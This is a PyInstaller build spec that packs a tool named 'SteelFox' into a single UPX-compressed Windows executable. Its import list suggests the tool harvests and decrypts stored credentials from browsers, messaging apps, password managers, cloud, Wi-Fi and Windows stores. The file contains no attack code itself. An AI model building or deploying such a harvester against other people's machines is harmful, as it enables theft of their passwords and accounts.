# -*- mode: python ; coding: utf-8 -*-
"""
SteelFox — PyInstaller .spec file

Build a standalone Windows executable:
    pip install pyinstaller
    pyinstaller steelfox.spec

This produces: dist/steelfox.exe  (single file, console app)
"""

import sys

block_cipher = None

a = Analysis(
    ["steelfox.py"],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        "steelfox",
        "steelfox.core",
        "steelfox.core.config",
        "steelfox.core.module_base",
        "steelfox.core.module_loader",
        "steelfox.core.output",
        "steelfox.core.privileges",
        "steelfox.core.runner",
        "steelfox.core.winapi",
        # Module packages
        "steelfox.modules",
        "steelfox.modules.browsers",
        "steelfox.modules.browsers.chromium",
        "steelfox.modules.browsers.firefox",
        "steelfox.modules.messaging",
        "steelfox.modules.messaging.discord",
        "steelfox.modules.messaging.telegram",
        "steelfox.modules.messaging.apps",
        "steelfox.modules.mails",
        "steelfox.modules.mails.mail_clients",
        "steelfox.modules.passwords",
        "steelfox.modules.passwords.managers",
        "steelfox.modules.cloud",
        "steelfox.modules.cloud.cloud_services",
        "steelfox.modules.gaming",
        "steelfox.modules.gaming.platforms",
        "steelfox.modules.devtools",
        "steelfox.modules.devtools.dev_credentials",
        "steelfox.modules.network",
        "steelfox.modules.network.wifi_vpn",
        "steelfox.modules.sysadmin",
        "steelfox.modules.sysadmin.remote_tools",
        "steelfox.modules.databases",
        "steelfox.modules.databases.db_clients",
        "steelfox.modules.windows",
        "steelfox.modules.windows.credentials",
        "steelfox.modules.reconnaissance",
        "steelfox.modules.reconnaissance.system_recon",
        # Dependencies
        "Crypto",
        "Crypto.Cipher",
        "Crypto.Cipher.AES",
        "Crypto.Cipher.DES3",
        "pyasn1",
        "sqlite3",
        "json",
        "ctypes",
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name="steelfox",
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,                     # Add a .ico file path here for branding
    version=None,
)
